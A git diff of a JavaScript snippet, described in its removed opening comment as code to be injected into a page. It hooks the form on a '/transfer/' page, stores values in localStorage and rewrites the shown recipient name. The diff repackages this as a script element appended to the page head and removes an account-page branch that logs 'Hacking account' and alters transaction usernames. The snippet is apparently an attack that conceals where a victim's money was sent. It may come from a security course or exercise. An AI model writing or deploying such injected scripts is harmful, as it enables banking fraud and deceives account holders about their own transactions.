@@ -1,8 +1,7 @@
-// this is the code which will be injected into a given page...
-
 (function() {
-
-	window.onload = function(){
+	var script = document.createElement('script');
+	script.type = 'text/javascript';
+	script.innerHTML = `
 		let path = window.location.pathname
 		if(path === '/transfer/'){
 			$("form:first").submit(
@@ -21,27 +20,6 @@
 			if(window.localStorage.getItem(parseFloat(money))){
 				receiver.text(window.localStorage.getItem(parseFloat(money)))
 			}
-		}
-		else if(window.location.pathname.includes('account')){
-			console.log("Hacking account")
-			$("tbody > tr").each(function(index){
-				let username = $(this).children().first().next()
-				let money = parseFloat(username.next().text())
-				usernam = username.text()
-				if(money < 0){
-					console.log(money)
-					money = String(money)
-					if(!String(money).includes('.')){
-						money = String(money) + '.0'
-						money = money.substr(1)
-					}
-					console.log(money)
-					if(window.localStorage.getItem(money)){
-						username.text(window.localStorage.getItem(money))
-					}
-				}
-			});
-		}
-	}
-
+		}`
+	document.getElementsByTagName('head')[0].appendChild(script);
 })();
